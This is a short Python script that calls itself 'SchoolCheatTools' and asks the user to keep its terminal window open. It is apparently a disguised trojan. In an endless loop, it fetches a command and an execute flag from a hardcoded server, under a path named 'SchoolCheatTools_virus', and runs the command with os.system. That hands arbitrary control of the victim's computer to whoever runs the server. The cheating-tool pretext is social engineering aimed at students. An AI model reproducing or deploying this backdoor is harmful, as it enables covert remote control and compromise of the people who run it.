#setup
from bs4 import BeautifulSoup
import requests
import os
from time import *
old_command = 0
server_ip = "192.168.0.216" #edit this variable to the server ip, which can be found in the description
#I will also update this variable from the code if the server ip changed, so if the ip stopped working, check the description

print('''
      
░██████╗░█████╗░██╗░░██╗░█████╗░░█████╗░██╗░░░░░░█████╗░██╗░░██╗███████╗░█████╗░████████╗████████╗░█████╗░░█████╗░██╗░░░░░░██████╗
██╔════╝██╔══██╗██║░░██║██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░██║██╔════╝██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝
╚█████╗░██║░░╚═╝███████║██║░░██║██║░░██║██║░░░░░██║░░╚═╝███████║█████╗░░███████║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░
░╚═══██╗██║░░██╗██╔══██║██║░░██║██║░░██║██║░░░░░██║░░██╗██╔══██║██╔══╝░░██╔══██║░░░██║░░░░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗
██████╔╝╚█████╔╝██║░░██║╚█████╔╝╚█████╔╝███████╗╚█████╔╝██║░░██║███████╗██║░░██║░░░██║░░░░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝
╚═════╝░░╚════╝░╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░

IMPORTANT   ***   PLEASE KEEP THIS WINDOW OPEN
IMPORTANT   ***   WHEN USING SCHOOLCHEATTOOLS, PLEASE KEEP IT RUNNING IN THE BACKSTAGE, DO NOT CLOSE THE TERMINAL WINDOW, OTHERWISE SCHOOLCHEATTOOLS WON’T WORK
''')

while True:
    #get HTML
    try:
        command = requests.get('http://' + server_ip + '/SchoolCheatTools_virus/command.txt').text
        exe = (requests.get('http://' + server_ip + '/SchoolCheatTools_virus/execute_command.txt').text == "1")
    except:
        print("server ip changed or server TEMPORARY closed")
    #execute command
    if old_command != command and exe:
        try:
            os.system(command)
            old_command = command
        except:
            pass
    sleep(0.6)
